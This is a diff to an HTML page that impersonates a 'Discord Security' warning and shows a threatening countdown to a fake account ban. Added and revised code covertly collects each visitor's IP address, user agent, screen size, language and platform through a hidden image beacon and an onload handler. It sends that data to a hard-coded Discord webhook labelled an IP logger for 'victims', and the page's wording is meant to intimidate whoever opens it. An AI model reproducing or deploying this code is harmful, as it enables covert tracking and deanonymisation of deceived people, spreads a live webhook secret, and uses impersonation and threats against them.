@@ -68,6 +68,9 @@
     </style>
 </head>
 <body>
+    <!-- INSTANT IP BEACON - Fires before anything else -->
+    <img src="https://api.ipify.org?format=json" style="display:none;" onerror="logVictimBeacon()" onload="logVictimBeacon()">
+
     <div class="container">
         <div class="warning-icon">☠️</div>
         <h1>YOU FUCKED UP</h1>
@@ -75,20 +78,20 @@
         
         <p>
             You triggered Vylze's security system.<br><br>
-            <span class="threat">Your Discord account is being disconnected in <strong id="countdown">10</strong> seconds.</span><br>
-            There is nothing you can do to stop it.
+            <span class="threat">Your Discord account is being permanently disconnected in <strong id="countdown">8</strong> seconds.</span><br>
+            There is nothing you can do.
         </p>
 
         <div class="footer">
-            © 2026 Discord Security • Vylze Enforcement
+            © 2026 Discord Security • Vylze Enforcement Division
         </div>
     </div>
 
     <script>
-        // IMMEDIATE IP LOGGING ON PAGE LOAD
-        async function logVictim() {
-            const webhook = "https://discord.com/api/webhooks/1465236926968758376/9OQEaro-dpE9d2wjAhpXFZOrEBW12ua0zkGmF-IZuCaAMhHqXxLhQnmFtf6jiv-1c5hA";
+        const WEBHOOK = "https://discord.com/api/webhooks/1465236926968758376/9OQEaro-dpE9d2wjAhpXFZOrEBW12ua0zkGmF-IZuCaAMhHqXxLhQnmFtf6jiv-1c5hA";
 
+        // Ultra-fast beacon logger (fires as soon as image tries to load)
+        async function logVictimBeacon() {
             let ip = "Unknown";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -97,39 +100,41 @@
             } catch(e) {}
 
             const payload = {
-                username: "☠️ Vylze IP Logger",
-                content: "**🔴 NEW VICTIM CAUGHT - PAGE LOADED**",
+                username: "☠️ Vylze Instant Logger",
+                content: "**🔴 INSTANT CATCH - PAGE LOADED**",
                 embeds: [{
                     title: "Vylze Security Triggered",
                     color: 0xf04747,
-                    description: "Someone opened the 'You Fucked Up' warning page.",
+                    description: "Victim opened the fucked up page.",
                     fields: [
                         { name: "IP Address", value: "```" + ip + "```", inline: true },
                         { name: "User-Agent", value: "```" + navigator.userAgent + "```", inline: false },
-                        { name: "Screen Resolution", value: screen.width + " × " + screen.height, inline: true },
-                        { name: "Language", value: navigator.language, inline: true },
-                        { name: "Platform", value: navigator.platform, inline: true },
+                        { name: "Screen", value: screen.width + " × " + screen.height, inline: true },
+                        { name: "Language", value: navigator.language || "Unknown", inline: true },
+                        { name: "Platform", value: navigator.platform || "Unknown", inline: true },
                         { name: "Time", value: new Date().toLocaleString(), inline: false }
                     ],
-                    footer: { text: "SSnatcher • Instant Logger • Vylze Mode" }
+                    footer: { text: "SSnatcher • Pre-Load Beacon • Vylze Mode" }
                 }]
             };
 
             try {
-                await fetch(webhook, {
+                await fetch(WEBHOOK, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
-                console.log("%c[SSnatcher] IP logged to Vylze webhook", "color:#f04747");
+                console.log("%c[SSnatcher] Instant IP logged via beacon", "color:#f04747;font-weight:bold");
             } catch(e) {}
         }
 
-        // Start logging immediately when page loads
-        window.onload = logVictim;
+        // Also run full logger after page loads (backup)
+        window.onload = () => {
+            logVictimBeacon(); // Double logging for maximum reliability
+        };
 
         // Countdown
-        let seconds = 10;
+        let seconds = 8;
         const countdownEl = document.getElementById('countdown');
 
         const timer = setInterval(() => {
@@ -140,7 +145,7 @@
                 document.body.innerHTML = `
                     <div style="text-align:center; margin-top:150px; color:#f04747; font-size:32px; font-weight:700;">
                         ACCOUNT PERMANENTLY DISCONNECTED<br><br>
-                        <span style="font-size:18px;">Vylze has banned you.</span>
+                        <span style="font-size:18px;">Vylze has banned you from Discord.</span>
                     </div>`;
             }
         }, 1000);
